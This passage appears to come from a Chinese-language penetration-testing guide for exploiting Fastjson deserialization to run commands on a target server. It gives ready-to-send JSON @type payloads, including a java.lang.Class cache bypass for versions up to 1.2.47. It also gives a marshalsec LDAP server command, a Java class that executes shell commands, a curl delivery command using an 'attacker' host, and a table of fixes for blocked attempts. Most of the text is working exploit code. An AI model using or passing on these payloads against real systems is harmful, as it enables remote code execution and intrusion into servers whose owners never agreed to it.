预期：报错里带 `com.alibaba.fastjson` 字样 = 确认 Fastjson；`autoType is not support` 说明有黑名单/默认关闭；DNSLog 收到解析 = 解析链路通。

#### 第 2 步：1.2.24 及以下直接打
```json
{
  "a": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://attacker:1389/Evil",
    "autoCommit": true
  }
}
```
原理：`autoCommit` 赋值触发 `connect()` → 用 `dataSourceName` 发起 JNDI 查询 → LDAP 返回恶意类工厂 → 目标加载 Evil 类并执行其静态块/构造器中的命令。1.2.24 及以下 autoType 全开，直接可用。

#### 第 3 步：1.2.25–1.2.47 用 cache 绕过
autoTypeSupport 默认关闭且有黑名单后，利用 `java.lang.Class` 把目标类先塞进类型缓存，绕过检查（≤1.2.47 可用，1.2.48 修复）：
```json
{
  "a": { "@type": "java.lang.Class", "val": "com.sun.rowset.JdbcRowSetImpl" },
  "b": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://attacker:1389/Evil",
    "autoCommit": true
  }
}
```
先解析 `a` 把 `com.sun.rowset.JdbcRowSetImpl` 写入缓存，再解析 `b` 时缓存命中、不再走黑名单检查。

#### 第 4 步：起恶意 JNDI 服务
```bash
# marshalsec 起 LDAP 引用服务：收到查询后返回 http://attacker/Evil.class 的引用
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker/Evil.class" 1389
```
恶意类 Evil.class 两种来源：
- ysoserial 的 JNDIExploit / `ysoserial.exploit.JRMPListener` 配合
- 手工编译：写一个 `static {}` 或构造器里执行命令的 Java 类，`javac Evil.java` 得到 Evil.class 放到攻击机 HTTP 目录

```java
// Evil.java：编译后放到 http://attacker/Evil.class
public class Evil {
    static {
        try {
            Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "id > /tmp/fastjson_pwn"});
        } catch (Exception e) {}
    }
}
```
```bash
javac Evil.java && python3 -m http.server 80
```

#### 第 5 步：投递 payload 并验证
```bash
curl -s -X POST 'http://t/api' -H 'Content-Type: application/json' \
  -d '{"a":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker:1389/Evil","autoCommit":true}}'
```
预期：LDAP 服务打印收到查询 → HTTP 日志显示 Evil.class 被拉取 → 目标上命令执行（`/tmp/fastjson_pwn` 生成或 DNSLog 收到）。先确认 LDAP 收到查询，再确认命令结果。

> [!warn] 高版本 Fastjson 默认 `autoTypeSupport=false` 并带 checkAutoType 黑名单，直接 @type 会报错；利用还受目标 JDK 版本影响（LDAP 远程类加载老版本才放开）。先探测版本再选链，1.2.83+ 基本只剩 jndi 类的本地 gadget 或直接放弃这条链。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| LDAP 服务没收到任何查询 | payload 被黑名单拦（报 autoType is not support） | 试 1.2.47 cache 绕过；确认版本 ≤1.2.47 |
| LDAP 收到查询但 HTTP 没拉 Evil.class | 目标 JDK ≥ 8u191 禁远程类加载 | 换本地 classpath gadget（Tomcat EL/Groovy 链）或降级目标 |
| 请求返回 500 | 接口先做 JSON schema 校验，或 @type 字段被业务代码过滤 | 找不走校验的其他字段/接口；确认 Content-Type 是 application/json |
| 无任何报错也无回显 | 版本太高已修复，或解析失败被吞 | 用 DNSLog 探测（Inet4Address）确认解析链路，再判断版本策略 |
| 命令执行没效果 | `Runtime.exec` 不支持 `|` 管道等 shell 语法 | 用 `/bin/sh -c "命令"` 数组形式，先写文件再读 |

#### 实战要点
- 先探测再打：报错回显看版本，DNSLog 看解析链路，两条都确认了再上 JNDI
- 1.2.24 直打 JdbcRowSetImpl；1.2.25–1.2.47 走 `java.lang.Class` cache 绕过
- LDAP 服务端日志是调试利器：收到查询 = 攻击面通了，没收到 = payload 被拦
- JDK 版本决定成败：<8u191 远程类加载可用，8u191+ 要换本地 gadget 链
- 恶意类命令用数组形式 + 写文件验证，规避 `Runtime.exec` 的 shell 语法坑
